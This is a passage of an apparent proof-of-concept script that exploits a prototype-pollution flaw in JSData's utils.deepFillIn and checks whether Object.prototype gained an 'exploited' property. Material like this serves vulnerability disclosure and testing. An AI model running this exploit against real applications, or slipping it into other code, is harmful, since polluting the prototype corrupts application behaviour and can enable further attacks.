  }

  console.log("[*] Triggering utils.deepFillIn recursively...");
  // deepFillIn iterates over `payload` keys and assigns them to `target`.
  // Because the function lacks explicit sanitization for dangerous prototype keys 
  // like '__proto__', the assignment dynamically resolves to Object.prototype,
  // injecting the 'exploited' property globally across all objects.
  JSData.utils.deepFillIn(target, payload);

  console.log("[*] Verifying polluted state after exploit...");
  if ({}.exploited === true) {
    throw new Error("[!] PROOF: Prototype pollution successful. Object.prototype.exploited is set to true.");
  } else {
    throw new Error("[-] FAILURE: Pollution not detected. The vulnerability may be patched or the payload requires environment-specific adjustment.");
  }
